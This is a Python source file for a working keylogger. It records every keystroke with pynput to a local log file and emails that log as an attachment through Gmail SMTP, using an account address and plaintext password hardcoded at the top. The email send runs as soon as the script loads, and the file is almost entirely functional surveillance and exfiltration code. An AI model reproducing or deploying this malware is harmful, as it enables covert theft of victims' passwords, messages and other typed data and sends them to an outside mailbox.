from pynput.keyboard import Key, Listener
from re import sub
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


filename = "the_keylogger_i_made_log.txt"
path = ""
extension = "\\"
fromaddr = "somethingawesomekeylogger58@gmail.com"
toaddr = "somethingawesomekeylogger58@gmail.com"
password = "pythonkeylogger"

count = 0
keys = []

replacement_map = {
    "Key.backspace": "[<-]",
    "Key.space": " ",
    "Key.left": "[<]",
    "Key.right": "[>]",
    "Key.up": "[^]",
    "Key.down": "[v]",
    "Key.enter": "[enter]\n"
}


def send_email(filename, attachment, toaddr):
    # global fromaddr, toaddr, password

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "log file dump"
    body = "Body of the email"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet_stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()


send_email(filename, path + filename, toaddr)


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    # reset
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    fullpath = path + filename
    with open(fullpath, "a") as f:
        for key in keys:
            print(f"key = {key}")
            # get rid of annoying single quotes
            k = sub(r"[\'\"](.*)[\'\"]", r"\1", str(key))

            if k in replacement_map:
                f.write(replacement_map[k])

            # in case of other special characters, get rid of the "key." bit
            else:
                f.write(sub(r"Key\.(.*)", r"[\1]", k))

            f.close()


def on_release(key):
    if key == Key.esc:
        return False


if __name__ == "__main__":
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
